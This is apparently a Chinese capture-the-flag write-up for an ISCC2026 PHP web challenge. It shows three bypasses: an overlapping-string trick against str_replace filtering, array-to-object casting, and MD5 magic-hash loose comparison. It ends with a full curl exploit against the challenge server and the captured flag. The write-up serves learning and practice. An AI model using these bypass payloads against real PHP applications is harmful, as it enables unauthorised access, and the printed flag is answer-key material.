+++
title = "消失的密钥"
date = "2026-05-03"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
源码泄露了一个入口
```text
http://39.105.213.28:12601/?source=1
```

拿到关键代码后，可知有三层校验。

第一层：

```php
$filtered = str_replace("key", "", $_GET['step1']);
if ($filtered === "key")
```

这里利用重叠绕过，构造：

```text
step1=kkeyey
```

因为：

```php
str_replace("key", "", "kkeyey") === "key"
```

第二层：

```php
$a = $_POST['a'] ?? null;
$obj_a = (object)$a;
$user_key = $obj_a->key;

if (isset($user_key) && $user_key === "1337")
```

所以 POST 传：

```text
a[key]=1337
```

数组转对象后即可满足 `$obj_a->key === "1337"`。

第三层：

```php
$val_a = $_GET['a'] ?? "";
$val_b = $_GET['b'] ?? "";

if ($val_a !== "" && $val_b !== "" && $val_a !== $val_b) {
    if (md5($val_a) == md5($val_b)) {
        echo $flag;
    }
}
```

这里是典型 MD5 魔术哈希弱比较，使用：

```text
a=QNKCDZO
b=240610708
```

对应 md5 为：

```text
md5("QNKCDZO")   = 0e830400451993494058024219903391
md5("240610708") = 0e462097431906509019562988736854
```

两者在 `==` 比较下都会被当作数字 `0`，因此条件成立。

**最终利用**

```bash
curl 'http://39.105.213.28:12601/?step1=kkeyey&a=QNKCDZO&b=240610708' \
  -X POST \
  -d 'a[key]=1337'
```

**Flag**

```text
ISCC{kEDVBedpWYPYtNWSEDnwMDcz6}
```
